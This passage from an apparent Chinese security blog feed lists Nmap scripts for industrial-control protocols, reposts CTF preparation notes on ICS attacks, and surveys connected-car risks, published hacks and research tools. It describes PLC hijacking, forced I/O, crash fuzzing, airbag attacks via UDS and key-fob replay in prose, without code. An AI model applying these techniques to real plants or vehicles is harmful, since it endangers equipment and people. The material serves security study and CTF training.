]]></summary>
        <content type="html"><![CDATA[<p>这里的nse脚本列表是针对工控协议的</p>
<!--more-->
<table>
<thead>
<tr>
<th>Nmap NSE脚本</th>
<th>端口</th>
<th>插件信息</th>
</tr>
</thead>
<tbody>
<tr>
<td>mms-identify.nse</td>
<td>102</td>
<td>iec-61850-8-1 (mms) ics protocol</td>
</tr>
<tr>
<td>s7-enumerate.nse</td>
<td>102</td>
<td>numerates Siemens S7 PLC Devices and collects their device information</td>
</tr>
<tr>
<td>modbus-discover.nse</td>
<td>502</td>
<td>Enumerates SCADA Modbus slave ids (sids) and collects their device information</td>
</tr>
<tr>
<td>modicon-info.nse</td>
<td>502</td>
<td>use Modbus to communicate to the PLC via Normal queries that are performed via engineering software</td>
</tr>
<tr>
<td>cr3-fingerprint.nse</td>
<td>789</td>
<td>Fingerprints Red Lion HMI devices</td>
</tr>
<tr>
<td>moxa-enum.nse</td>
<td>4800</td>
<td>MoxaNPort</td>
</tr>
<tr>
<td>melsecq-discover.nse</td>
<td>5007</td>
<td>MELSEC-Q Series PLC CPUINFO</td>
</tr>
<tr>
<td>melsecq-discover-udp.nse</td>
<td>5006</td>
<td>MELSEC-Q Series PLC CPUINFO</td>
</tr>
<tr>
<td>BACnet-discover-enumerate.nse</td>
<td>47808</td>
<td>BACnet</td>
</tr>
<tr>
<td>atg-info.nse</td>
<td>10001</td>
<td>Guardian AST I20100</td>
</tr>
<tr>
<td>codesys-v2-discover.nse</td>
<td>1200/2455</td>
<td>received then the output will show that the port as CoDeSyS</td>
</tr>
<tr>
<td>cspv4-info.nse</td>
<td>2222</td>
<td>cspv4-info</td>
</tr>
<tr>
<td>dnp3-info.nse</td>
<td>20000</td>
<td>DNP3</td>
</tr>
<tr>
<td>enip-enumerate.nse</td>
<td>44818</td>
<td>Information that is parsed includes Vendor ID, Device Type, Product name, Serial Number, Product code,Revision Number, as well as the Device IP</td>
</tr>
<tr>
<td>fox-info.nse</td>
<td>1911</td>
<td>collect information from A Tridium Niagara system</td>
</tr>
<tr>
<td>omrontcp-info.nse</td>
<td>9600</td>
<td>Controller Data Read Command and once a response is received</td>
</tr>
<tr>
<td>omronudp-info.nse</td>
<td>9600</td>
<td>Controller Data Read Command and once a response is received</td>
</tr>
<tr>
<td>pcworx-info.nse</td>
<td>1962</td>
<td>PCWorx info</td>
</tr>
<tr>
<td>proconos-info.nse</td>
<td>20547</td>
<td>ProConOs</td>
</tr>
<tr>
<td>Siemens-CommunicationsProcessor.nse</td>
<td>80</td>
<td>Checks for SCADA Siemens S7 Communications Processor devices</td>
</tr>
<tr>
<td>Siemens-HMI-miniweb.nse</td>
<td>80</td>
<td>Checks for SCADA Siemens SIMATIC S7- devices</td>
</tr>
<tr>
<td>Siemens-SIMATIC-PLC-S7.nse</td>
<td>80</td>
<td>Checks for SCADA Siemens Simatic S7 devices</td>
</tr>
<tr>
<td>Siemens-Scalance-module.nse</td>
<td>161</td>
<td>Checks for SCADA Siemens SCALANCE modules</td>
</tr>
<tr>
<td>Siemens-WINCC.nse</td>
<td>137</td>
<td>Checks for SCADA Siemens WINCC server</td>
</tr>
<tr>
<td>bradford-networks-nac.nse</td>
<td>8080</td>
<td>Attempts to detect Bradford Networks Network Sentry appliance admin web interface</td>
</tr>
<tr>
<td>iec-identify.nse</td>
<td>2404</td>
<td>Attemts to check tcp/2404 port supporting IEC 60870-5-104 ICS protocol</td>
</tr>
<tr>
<td>minecraft.nse</td>
<td>25565</td>
<td>Checks for Minecraft Servers using the 0x02 &quot;Handshake&quot; protocol</td>
</tr>
<tr>
<td>mop-discover.nse</td>
<td>null</td>
<td>Detect the Maintenance Operation Protocol (MOP) by sending layer 2 DEC DNA Remote Console hello/test messages</td>
</tr>
<tr>
<td>stuxnet-detect.nse</td>
<td>445</td>
<td>Detects whether a host is infected with the Stuxnet worm</td>
</tr>
</tbody>
</table>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：CTF赛前小知识]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-ctf-sai-qian-xiao-zhi-shi</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-ctf-sai-qian-xiao-zhi-shi">
        </link>
        <updated>2018-11-09T06:17:00.000Z</updated>
        <summary type="html"><![CDATA[<p>看到一篇有关工控CTF的赛前知识点介绍，感觉比较详细的，在此分享一下</p>
]]></summary>
        <content type="html"><![CDATA[<p>看到一篇有关工控CTF的赛前知识点介绍，感觉比较详细的，在此分享一下</p>
<!--more-->
<h2 id="工控比赛考察点">工控比赛考察点</h2>
<p>采用 CTF 分类模型，总结分析当前工控 ICS 比赛中的关键点</p>
<table>
<thead>
<tr>
<th style="text-align:left">比赛类型</th>
<th style="text-align:left">考察点</th>
<th style="text-align:left">与 CTF 异同</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">内网渗透</td>
<td style="text-align:left">Web 端渗透测试、CMS 系统、工控发布展示系统、数据库系统</td>
<td style="text-align:left">与 Web 渗透相关</td>
</tr>
<tr>
<td style="text-align:left">逆向分析</td>
<td style="text-align:left">固件分析、工控软件逆向</td>
<td style="text-align:left">实际场景逆向</td>
</tr>
<tr>
<td style="text-align:left">工控协议</td>
<td style="text-align:left">工控流量分析、Misc 类</td>
<td style="text-align:left">Misc 流量分析，工控场景流量特征</td>
</tr>
<tr>
<td style="text-align:left">工控编程</td>
<td style="text-align:left">PLC 组态、HMI 组态、RTU 组态等</td>
<td style="text-align:left">工控实际组态软件使用，梯形图识别与分析</td>
</tr>
</tbody>
</table>
<p>根据漏洞类型其实还可以区分细化题目类型，包括常见的 Web 注入类、固件弱口令、后门程序、协议重放与逻辑问题、组态部署问题等常见的工控场景安全问题。</p>
<table>
<thead>
<tr>
<th>比赛类型</th>
<th>漏洞类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>内网渗透</td>
<td>Web 类（SQL、XSS、命令注入、敏感文件泄露. git/.idea/.project 等、）</td>
</tr>
<tr>
<td>逆向分析</td>
<td>固件分析、工控软件逆向</td>
</tr>
<tr>
<td>工控协议</td>
<td>工控流量分析、Misc 类</td>
</tr>
<tr>
<td>工控编程</td>
<td>PLC 组态、HMI 组态</td>
</tr>
</tbody>
</table>
<h3 id="web-渗透类web">Web 渗透类（Web）</h3>
<p>该节主要谈工控 Web 渗透的特点：</p>
<ul>
<li>
<p>与业务场景高度契合，例如工业控制中，Web 端主要为显示当前使用场景中的控制参数、运行状态等信息，如果在内网中被中间人劫持，当 HMI 显示设备无法与 PLC 等实时运行设备同步时，系统会报警或出错。</p>
</li>
<li>
<p>一般采用通用技术展示 Web 界面，以 windows 操作系统为主要平台，包括 WinCC、Windows Server、Windows 98/2000/XP 等看似古老的系统为主。</p>
</li>
<li>
<p>Web 渗透的同时会保留多个端口，例如 FTP、HTTPS、Telnet、SNMP、NTP 等服务端口，在 Web 渗透无法打穿的同时可以试试其他端口。</p>
</li>
<li>
<p>工控由于一般处于内网环境，内网劫持往往比较有效，但是如果内网配置了静态 IP 或其他防护措施，ARP 欺骗方式等内网劫持方法无法起效。</p>
</li>
<li>
<p>敏感信息泄露，配置文件不完善是工控 Web 发布常见问题，不仅仅包括. git/.idea/.project 等工程信息协议，还可能出现路径遍历、命令注入、弱口令等问题。</p>
</li>
</ul>
<h3 id="逆向分析reverse">逆向分析（Reverse）</h3>
<p>该节主要讨论工控逆向的特点：</p>
<ul>
<li>
<p>工控操作系统一般为 RTOS（Real Time Operate System）, 例如 vxworks、uc-os 等实时操作系统，在逆向前需要对其架构和指令集需要比较熟悉，如果不懂请自行学习。</p>
</li>
<li>
<p>工控固件逆向常见的目标是工控工程加密算法、硬编码秘钥、硬编码后门等常见固件逆向漏洞，如果发现了堆栈溢出类漏洞，往往能够导致目标设备宕机（即 DOS 后果）。</p>
</li>
<li>
<p>工控固件往往存在加密和压缩情况，需要在第一步解压过程对其进行解压或解密，这部分依据具体厂商来定，不能一概而论。</p>
</li>
<li>
<p>工控固件存在逆向分析不出的情况</p>
</li>
</ul>
<h3 id="工控协议protocol">工控协议（Protocol）</h3>
<p>该节主要谈论工控协议类题目的相关特点：</p>
<ul>
<li>
<p>工控协议针对工控场景设计，具有简单、高效、低延时等特点，所以针对此类的攻击完全可以考虑采用重放、命令注入等简单攻击手段。</p>
</li>
<li>
<p>工控协议不仅仅采用公开协议、还包括众多的私有协议，这部分协议具体细节需要逆向或者采集数据来实现数据功能的还原。例如 Modbus、DNP3、Melsec-Q、S7、Ethernet/IP 等。</p>
</li>
<li>
<p>工控协议可能导致目标 PLC、DCS、RTU 等设备出现宕机、不可重启等问题，采用基于 Fuzz 的方法可以快速高效发现 PLC 宕机类漏洞。</p>
</li>
<li>
<p>工控协议中可能有众多针对 PLC 等设备的操作，用户需要区分哪些是合法请求、哪些是异常请求，这需要经验，需要研究推断当前流量的使用逻辑。这个场景很适合机器学习的条件，这可以考虑是个探索的方向。</p>
</li>
<li>
<p>针对工控场景的实际防御方案其实最好的还是旁路检测，通过分光将流量接入分析系统，在不影响正常业务使用的同时对目标系统进行安全监控。</p>
</li>
</ul>
<h3 id="工控编程program">工控编程（Program）</h3>
<p>工控编程是工控系统运行的核心和重点，此类题目特点一般是：</p>
<ul>
<li>
<p>工控编程核心为明白工控业务逻辑，而工控编程遵循 IEC61131-3（工控史上首例实现 PLC、DCS、运动控制、 SCADA 等联合编程的标准——IEC61131-3），包括 5 种编程语言标准，3 种是图形化语言（梯形图、顺序功能图和功能块图），两种是文本化语言（指令表和结构文本）。</p>
</li>
<li>
<p>工控设备往往可以在线调试，从而可以控制某些输入输出端口，实现强制启停的功能，如果这些功能可以采用 Remote 方式重发，那攻击危害就更为严重。</p>
</li>
<li>
<p>工控设备的连接方式多样，一般采用串口，但是目前设备发展支持以太网、USB 接口等新的方式，如果网口不行试试串口、USB。</p>
</li>
<li>
<p>工控组态可以非常复杂，甚至连接成百上千个输入输出都有可能，组态中会由于添加了新的组件而更加麻烦，这时候要慢慢看，一点一点缕出来。</p>
</li>
</ul>
<h2 id="工控设备发现">工控设备发现</h2>
<p>工控设备发现是工控比赛的前提，目前针对工控设备扫描中，在 Nmap、Metasploit、Censes 集成了大量的工具，用于挖掘当前在线 PLC、DCS 等 ICS 设备。</p>
<h3 id="工控扫描脚本">工控扫描脚本</h3>
<h4 id="基于工控端口的nmap扫描脚本">基于工控端口的nmap扫描脚本</h4>
<p>在大量 IP 中如何发现工控设备, 除了工控特殊端口意外，大量端口都是正常服务，例如 ftp、ssh、telnet、smtp、ntp 等正常网络服务。下面列表列举了当前可以利用开源工控扫描脚本。</p>
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1564127358828.png" alt=""></figure>
<p>上述脚本并未完全整列了当前能够使用脚本信息，未完待续中......</p>
<h4 id="基于工控组态软件的组件扫描">基于工控组态软件的组件扫描</h4>
<p>各工控厂商往往自带组态软件，组态软件时连接当前内网内设备时可自主发现目标 PLC 设备</p>
<table>
<thead>
<tr>
<th>端口</th>
<th>协议 / 设备</th>
<th>连接方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>102(TCP)</td>
<td>siemens s7</td>
<td>西门子软件 Step7 自带扫描当前网段 PLC 设备功能</td>
</tr>
<tr>
<td>502(TCP)</td>
<td>modbus</td>
<td>施耐德 SoMachine Basic 连接 PLC 设备自带扫描内网网段功能</td>
</tr>
</tbody>
</table>
<h3 id="工控扫描与发现引擎">工控扫描与发现引擎</h3>
<h4 id="shodan-引擎">Shodan 引擎</h4>
<p>Shodan 是一款网络空间搜索引擎，主要搜索的是存在于互联网中的设备，服务器、摄像头、工控设备、智能家居等，并且可以识别出其版本，位置，端口，服务等信息。Shodan 于 2013 年增加了针对工控协议的探测，用户可以直接使用工控协议的端口直接检索该协议的所有数据，用户也可以使用特征 Dork 直接搜索对应设备数据。</p>
<h4 id="zoomeye-引擎">Zoomeye 引擎</h4>
<p>ZoomEye 是知道创宇打造的面向网络空间的搜索引擎，ZoomEye 于 2015 年 3 月上线了工控专题 (ics.zoomeye.org)，ZoomEye 支持 12 种工控协议的数据检索，使用者也可以使用工控协议的端口和特征 Dork 关键字发现暴露在互联网的工控软硬件，对于工控协议类型的数据，ZoomEye 启用了保护策略，一般用户无法直接查看。</p>
<h4 id="fofa-引擎">FOFA 引擎</h4>
<p>FOFA 是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等</p>
<h4 id="diting-全网引擎">Diting 全网引擎</h4>
<p>谛听 (ditecting) 网络空间工控设备搜索引擎，取谛听辨识万物之意，属意在搜寻暴露在互联网上的工业控制系统联网设备， 帮助安全厂家维护工控系统安全、循迹恶意企图人士。</p>
<h4 id="censys-全网引擎">Censys 全网引擎</h4>
<p>Censys 是一款搜索引擎，它允许计算机科学家了解组成互联网的设备和网络。Censys 由因特网范围扫描驱动，它使得研究人员能够找到特定的主机，并能够针将设备、网站和证书的配置和部署信息创建到一个总体报告中。</p>
<p>各类漏洞引擎内容不同，采取配置、部署节点等存在较大的差异，目前针对工控这块的搜索引擎以 shodan 和 ditecting 更为专业，但是从针对端口来看，各个引擎宣称的公布检索方式不尽相同。</p>
<h2 id="工控漏洞利用">工控漏洞利用</h2>
<h3 id="组态利用">组态利用</h3>
<p>组态是工控场景的核心，是工控编程与实现功能的核心内容，如果你不太懂组态，请自行学习自动化领域工业控制系统组态的相关书籍。 最好的学习方式是拿到相关的产品说明书，针对说明书上的内容一点一点学习。</p>
<h4 id="组态的利用方法">组态的利用方法</h4>
<ul>
<li>强制 IO(最管用的一种调试方法)</li>
<li>工程加密与解密（工程加密是 PLC 一种保护措施，但仍存在被破解的可能）</li>
<li>上载下载（基础概念请自行恶补）</li>
<li>PLC 等目标设备的内存分布（基础概念请自行恶补）</li>
<li>其他附加功能（例如 ftp、ntp 等）</li>
</ul>
<h3 id="通信劫持">通信劫持</h3>
<p>通信劫持是工控场景中最经典利用方式，例如 ARP 劫持、PLC/HMI 通信劫持、PLC 会话劫持、PLC 命令执行等内容。</p>
<h4 id="通信劫持的方法">通信劫持的方法</h4>
<ul>
<li>ARP 劫持，ARP 劫持可以阻断 PLC 与其他设备的通信，鉴于工程会存在写死 IP 等交互地址，未必管用，但是值得一试</li>
<li>PLC/HMI 通信劫持，采用旁路设备接入或控制 PLC 设备，对 IO 进行强制重写或输出</li>
<li>PLC 命令执行，针对工控设备最敏感的部分是设备宕机（无法恢复的）、设备启停、设备强制更新参数，等等这些对普通工艺能够产生较大的影响。</li>
</ul>
<h3 id="web-渗透">Web 渗透</h3>
<p>目标企业往往存在 Web 类工控应用，例如发布工艺发布页面，用户数据库等页面，这些内容基本与平日 Web 题目无异。</p>
<h4 id="web渗透的常用方法">Web渗透的常用方法</h4>
<ul>
<li>弱口令（工控里比较常见，工控设备中厂商默认密码）</li>
<li>命令注入（比较普遍，需要审计 Web 工程源码）</li>
<li>目录遍历（手测简单，利用难，需要结合上传等功能实现）</li>
<li>预置后门（比较难以发现，需要逆向和 Web 渗透相结合）</li>
<li>SQL 类注入（比较简单）</li>
<li>XSS 在这里基本无用（基本没怎么遇到过）</li>
<li>工程文件泄露（.git/.idea/.project 等工程文件泄露）</li>
</ul>
<p>转自：https://ctf-wiki.github.io/ctf-wiki/ics/</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[智能汽车安全研究：风险点、破解案例、研究工具]]></title>
        <id>https://hi-kk.github.io//post/zhi-neng-qi-che-an-quan-yan-jiu-feng-xian-dian-po-jie-an-li-yan-jiu-gong-ju</id>
        <link href="https://hi-kk.github.io//post/zhi-neng-qi-che-an-quan-yan-jiu-feng-xian-dian-po-jie-an-li-yan-jiu-gong-ju">
        </link>
        <updated>2018-11-01T07:08:27.000Z</updated>
        <summary type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>很幸运公司采购了一台荣威智能网联汽车给我们作研究（壕）<br>
之前对关于网联汽车的安全研究只是道听途说，看着各种大佬对汽车一顿操作，实际上自己也没这条件去做这方面研究，所以现在既然有了这么宝贵的机会，就好好把握<br>
于是就各种Google搜罗相关资料，这里就分享下自己对搜集到各种资料进行的一个入门性总结，希望能够帮助其他跟我一样刚接触、准备研究汽车安全的朋友对这块知识体系做一个大概了解。<br>
这篇文章主要内容是智能网联汽车的风险点分析、已有的汽车破解案例以及入门汽车安全研究的一些工具</p>
]]></summary>
        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>很幸运公司采购了一台荣威智能网联汽车给我们作研究（壕）<br>
之前对关于网联汽车的安全研究只是道听途说，看着各种大佬对汽车一顿操作，实际上自己也没这条件去做这方面研究，所以现在既然有了这么宝贵的机会，就好好把握<br>
于是就各种Google搜罗相关资料，这里就分享下自己对搜集到各种资料进行的一个入门性总结，希望能够帮助其他跟我一样刚接触、准备研究汽车安全的朋友对这块知识体系做一个大概了解。<br>
这篇文章主要内容是智能网联汽车的风险点分析、已有的汽车破解案例以及入门汽车安全研究的一些工具</p>
<!-- more -->
<h1 id="智能网联汽车信息安全风险">智能网联汽车信息安全风险</h1>
<p>智能网联汽车从架构上可分为四个不同的功能区，分别是基本控制功能区，如传感单元、底盘系统等；扩展功能区，如远程信息处理、信息娱乐管理、车体系统等；外部接口，譬如LTE-V、蓝牙、WIFI等；以及手机、存储器、各种诊断仪表、云服务等外部功能区。</p>
<p>每个功能区对于安全的定义和需求都不相同，需要定义合理规范的系统架构，将不同功能区进行隔离，并对不同区域间的信息流转进行严格的控制，包括接入身份认证和数据加密，来保证信息安全传输，从而达到智能驾驶功能的高可用性、便利性和保护用户信息隐私的目的。</p>
<p>根据分析研究，智能网联汽车系统面临的攻击主要来自两方面——内部攻击和远程攻击。其中，内部攻击主要由智能网联自身缺陷引起，比如总线、网关、ECU等安全程度不够所导致。未来智能网联汽车面临的信息安全威胁梳理为来自云端、通道、终端三个维度。</p>
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1564129333430.png" alt=""></figure>
<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
<h2 id="一终端层安全风险">（一）终端层安全风险</h2>
<h3 id="1-t-box-安全风险">1、T-BOX 安全风险</h3>
<p>T-BOX（Telematics BOX）的网络安全系数决定了汽车行驶和整个智能交通网络的安全，是车联网发展的核心技术之一，恶意攻击者通过分析固件内部代码能够轻易获取加密方法和密钥，可实现对消息会话内容的破解。</p>
<h3 id="2-ivi-安全风险">2、IVI 安全风险</h3>
<p>车载信息娱乐系统（In-Vehicle Infotainment，IVI）的高集成度使其所有接口都可能成为黑客的攻击节点，因此IVI的被攻击面将比其他任何车辆部件都多。</p>
<h3 id="3-终端升级安全风险">3、终端升级安全风险</h3>
<p>智能网联汽车如不及时升级更新，就会由于潜在安全漏洞而遭受各方面（如 4G、 USB、 SD 卡、 OBD 等渠道）的恶意攻击，导致车主个人隐私泄露、车载软件及数据被窃取或车辆控制系统遭受恶意攻击等安全问题。</p>
<h3 id="4-车载-os-安全风险">4、车载 OS 安全风险</h3>
<p>车载电脑系统常采用嵌入式 Linux、 QNX、 Android等作为操作系统，其代码庞大且存在不同程度的安全漏洞，且车联网应用系统复杂多样，某一种特定的安全技术不能完全解决应用系统的所有安全问题。而智能终端还存在被入侵、控制的风险。</p>
<h3 id="5-移动app安全风险">5、移动App安全风险</h3>
<p>对于没有进行保护的App进行逆向分析挖掘，可直接看到 TSP（远程服务提供商）的接口、参数等信息。</p>
<h2 id="二传输通道安全风险">（二）传输通道安全风险</h2>
<h3 id="1-车载诊断系统接口">1、车载诊断系统接口</h3>
<p>基于车载诊断系统接口(OBD)的攻击现在的智能网联汽车内部都会有十几个到几十个不等的 ECU，不同 ECU 控制不同的模块。OBD 接口作为总线上的一个节点，不仅能监听总线上面的消息，而且还能伪造消息（如传感器消息）来欺骗 ECU，从而达到改变汽车行为状态的目的。</p>
<figure data-type="image" tabindex="2"><img src="https://hi-kk.github.io//post-images/1564129353735.png" alt=""></figure>
<h3 id="2-车内无线传感器安全风险">2、车内无线传感器安全风险</h3>
<p>传感器存在通讯信息被窃听、被中断、被注入等潜在威胁，甚至通过干扰传感器通信设备还会造成无人驾驶汽车偏行、紧急停车等危险动作。</p>
<h3 id="3-车内网络传输安全风险">3、车内网络传输安全风险</h3>
<p>汽车内部相对封闭的网络环境看似安全，但其中存在很多可被攻击的安全缺口，如胎压监测系统、 Wi-Fi、蓝牙等短距离通信设备等。</p>
<h3 id="4-车载终端架构安全风险">4、车载终端架构安全风险</h3>
<p>现在每辆智能网联汽车基本上都装有五六十个 ECU 来实现移动互联的不同功能，进入智能网联汽车时代后， 其接收的数据不仅包含从云端下载的内容，还有可能接收到那些通过网络连接端口植入的恶意软件，因此大大增加了智能网联汽车被“黑”的风险。</p>
<h3 id="5-网络传输安全风险">5、网络传输安全风险</h3>
<p>“车-X”（人、车、路、互联网等）通过 Wi-Fi、移动通信网(2.5G/3G/4G等)、DSRC等无线通信手段与其它车辆、交通专网、互联网等进行连接。网络传输安全威胁指车联网终端与网络中心的双向数据传输安全威胁。</p>
<h2 id="三-云平台安全威胁">（三） 云平台安全威胁</h2>
<p>目前大部分车联网数据使用分布式技术进行存储，主要面临的安全威胁包括黑客对数据恶意窃取和篡改、敏感数据被非法访问。<br>
<img src="https://hi-kk.github.io//post-images/1564130095864.png" alt=""></p>
<h1 id="汽车安全研究案例">汽车安全研究案例</h1>
<h2 id="1-tcu-攻击案例">1. TCU 攻击案例</h2>
<p>对 TBOX 的检测简单方式是找到集成电路板上 eSIM 卡， 使用漆包线将TBOX和手机以飞线的方式连接然后手机开启热点 把TBOX的网络共享出来，研究人员就可以通过手机共享的热点 连接到TBOX的内网探索车辆内部通讯网络。</p>
<figure data-type="image" tabindex="3"><img src="https://hi-kk.github.io//post-images/1564129388927.png" alt=""></figure>
<p>检测TBOX的集成电路板，查找供应商预留的调试接口或者 隐藏的特殊功能的针脚并以飞线的方式使电脑与TBOX集成电路板相连接，使用串口调试工具对其调试输出打印日志，可以得到 一些敏感信息如APN名称、物联网卡号、ICCID、私网服务器IP 地址和本地监听端口等信息，为后续的深入研究打下基础。</p>
<figure data-type="image" tabindex="4"><img src="https://hi-kk.github.io//post-images/1564129403932.png" alt=""></figure>
<p>​													——《2017智能网联汽车信息安全年度报告》</p>
<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
<h2 id="2-安全气囊攻击案例">2. 安全气囊攻击案例</h2>
<p><strong>攻击条件：</strong></p>
<ul>
<li>
<ol>
<li>车辆点火且车辆的速度必须小于6公里/小时。</li>
</ol>
</li>
<li>
<ol start="2">
<li>通过获得CAN总线访问权限以及OBD接口向车内网络发 送恶意构造的UDS对安全气囊进行攻击。</li>
</ol>
</li>
</ul>
<p><strong>漏洞影响：</strong> 可对车内乘客造成物理伤害，该漏洞影响到2014年起生产的 乘用车。</p>
<figure data-type="image" tabindex="5"><img src="https://hi-kk.github.io//post-images/1564129416013.png" alt=""></figure>
<p>​													——《2017智能网联汽车信息安全年度报告》</p>
<h2 id="3-斯巴鲁遥控钥匙系统攻击案例">3. 斯巴鲁遥控钥匙系统攻击案例</h2>
<p>某些型号的斯巴鲁汽车所采用的钥匙系统在对车辆进行上锁、解锁或其他操作时，使用的是序列码。</p>
<p>这种序列码也被称作是滚动代码或跳跃代码，为了避免攻击者发现车辆的序列码并使用这种设计缺陷来劫持汽车，这种序列码应该是随机的才对。</p>
<p>通过接收钥匙系统所发送出的一个数据包（例如，用户在按下钥匙系统的任何一个按键之后，攻击者只需要在信号范围内 就可以捕捉到数据包），攻击者将能够利用该数据包来推测出该车辆钥匙系统下一次生成的滚动代码，接下来他就可以使用这个预测码或者直接重放来上锁或解锁车辆。</p>
<figure data-type="image" tabindex="6"><img src="https://hi-kk.github.io//post-images/1564129430911.png" alt=""></figure>
<p>​													——《2017智能网联汽车信息安全年度报告》</p>
<h2 id="4-斯巴鲁车载娱乐系统攻击案例">4. 斯巴鲁车载娱乐系统攻击案例</h2>
<p>Guzman 发现斯巴鲁的移动应用程序使用随机生成的认证令牌，以便在有用户认证后允许访问，通常来说客户端与服务端采用这样的认证方式是很正常的，根据良好的 Web 应用安全实践，令牌应在短时间内过期或失效，以防止重用。然而问题是，Starlink 允许用户利用令牌永久登录斯巴鲁，也就是说令牌一旦生成，永远不会失效。据 Guzman 透露，令牌通过一个 URL 发送，并且被存放在未被加密的数据库中。</p>
<figure data-type="image" tabindex="7"><img src="https://hi-kk.github.io//post-images/1564129458116.png" alt=""></figure>
<figure data-type="image" tabindex="8"><img src="https://hi-kk.github.io//post-images/1564129473954.png" alt=""></figure>
<p>​													——《2017智能网联汽车信息安全年度报告》</p>
<h2 id="5-马自达车机娱乐系统破解案例">5. 马自达车机娱乐系统破解案例</h2>
<figure data-type="image" tabindex="9"><img src="https://hi-kk.github.io//post-images/1564129491831.png" alt=""></figure>
<figure data-type="image" tabindex="10"><img src="https://hi-kk.github.io//post-images/1564129511314.png" alt=""></figure>
<p>​													——《2017智能网联汽车信息安全年度报告》</p>
<h2 id="6-特斯拉汽车车联网系统攻击案例分析">6. 特斯拉汽车车联网系统攻击案例分析</h2>
<figure data-type="image" tabindex="11"><img src="https://hi-kk.github.io//post-images/1564129525905.png" alt=""></figure>
<figure data-type="image" tabindex="12"><img src="https://hi-kk.github.io//post-images/1564129541622.png" alt=""></figure>
<figure data-type="image" tabindex="13"><img src="https://hi-kk.github.io//post-images/1564129551215.png" alt=""></figure>
<figure data-type="image" tabindex="14"><img src="https://hi-kk.github.io//post-images/1564129566500.png" alt=""></figure>
<figure data-type="image" tabindex="15"><img src="https://hi-kk.github.io//post-images/1564129578107.png" alt=""></figure>
<figure data-type="image" tabindex="16"><img src="https://hi-kk.github.io//post-images/1564129589225.png" alt=""></figure>
<p>详见：《Zeronights 2016-特斯拉车载网关的安全研究Gateway_Internals_of_Tesla_Motors_v6》.pdf</p>
<figure data-type="image" tabindex="17"><img src="https://hi-kk.github.io//post-images/1564129598580.png" alt=""></figure>
<p>​													——《2017智能网联汽车信息安全年度报告》</p>
<h2 id="7-语音控制系统破解案例">7. 语音控制系统破解案例</h2>
<p>“海豚音”的攻击原理是将语音命令频率转换成为超声波频率信号，“海豚音”的攻击原理是将语音命令声音调制后加载到载波的超声波上，因为超出人耳接收频率的范围，无法被人听见，却可以被手机、智能家居以及智能汽车等智能设备的语音控制系统接收到。</p>
<p>由于麦克风的非线性特性，会将原本被调制的语音命令声音解调、恢复到调制之前的状态，之后滤波器会过滤掉人耳不可听到的部分，这样语音指令可以消无声息的被语音识别系统识别到，最终实现攻击。</p>
<p><img src="https://hi-kk.github.io//post-images/1564129612012.png" alt=""><br>
​													——《2017智能网联汽车信息安全年度报告》</p>
<h2 id="8-车辆gps轨迹窃取案例">8. 车辆GPS轨迹窃取案例</h2>
<figure data-type="image" tabindex="18"><img src="https://hi-kk.github.io//post-images/1564129624506.png" alt=""></figure>
<h2 id="9-主动刹车系统攻击案例">9. 主动刹车系统攻击案例</h2>
<figure data-type="image" tabindex="19"><img src="https://hi-kk.github.io//post-images/1564129640756.png" alt=""></figure>
<p>​													——《智能网联汽车信息安全白皮书（2016）》</p>
<h1 id="汽车研究硬件设备">汽车研究硬件设备</h1>
<h2 id="canable2960">CANable——$29/$60</h2>
<p>官网：https://canable.io/</p>
<p>CANable是一个小型低成本的开放源码USB到CAN适配器。CANable显示为计算机上的虚拟串行端口，充当到CAN总线接口的串行线。使用备选的candleLight固件，CANable枚举为Linux上的本地CAN接口。原有CANable目前缺货，但很快就可以在Protofusion商店https://store.protofusion.org/和Tindie上买到！</p>
<figure data-type="image" tabindex="20"><img src="https://hi-kk.github.io//post-images/1564129655710.png" alt=""></figure>
<figure data-type="image" tabindex="21"><img src="https://hi-kk.github.io//post-images/1564129668398.png" alt=""></figure>
<p><strong>——————<a href="https://github.com/hi-KK">By KEYONE</a>——————</strong></p>
<h2 id="obdlink49">OBDLink——$49+</h2>
<figure data-type="image" tabindex="22"><img src="https://hi-kk.github.io//post-images/1564129680348.jpg" alt=""></figure>
<p>一款易于使用，价格低廉，防黑客，轻便快捷的蓝牙OBD适配器。可将您的智能手机，平板电脑，笔记本电脑或电脑转变为精密的诊断扫描工具，行程计算机和实时性能监视器。</p>
<figure data-type="image" tabindex="23"><img src="https://hi-kk.github.io//post-images/1564129690307.png" alt=""></figure>
<p>官网：http://www.obdlink.com/</p>
<h1 id="hackrf1000">HackRF——￥1000+</h1>
<figure data-type="image" tabindex="24"><img src="https://hi-kk.github.io//post-images/1564129706212.jpg" alt=""></figure>
<figure data-type="image" tabindex="25"><img src="https://hi-kk.github.io//post-images/1564129717950.png" alt=""></figure>
<p>https://item.taobao.com/item.htm?spm=a1z10.1-c.w4004-13257850194.10.77953d88aiMmMA&amp;id=526187854860</p>
<h2 id="广成科技产品线">广成科技产品线</h2>
<figure data-type="image" tabindex="26"><img src="https://hi-kk.github.io//post-images/1564129733448.png" alt=""></figure>
<p>淘宝店铺：https://shop72369840.taobao.com/</p>
<p>官网：http://www.gcgd.net/</p>
<h2 id="icsim">ICSim</h2>
<p>http://opengarages.org/</p>
<figure data-type="image" tabindex="27"><img src="https://hi-kk.github.io//post-images/1564129751620.png" alt=""></figure>
<p>git clone https://github.com/zombieCraig/ICSim.git</p>
<p>详见：《Car Hacking CAE Tech Talk》.pdf</p>
<h2 id="scantool-free-open-source">ScanTool (free, open-source)</h2>
<p>sudo apt-get install scantool</p>
<figure data-type="image" tabindex="28"><img src="https://hi-kk.github.io//post-images/1564129764625.png" alt=""></figure>
<p>详见：《Car Hacking CAE Tech Talk》.pdf</p>
<h2 id="cantoolz">CANToolz</h2>
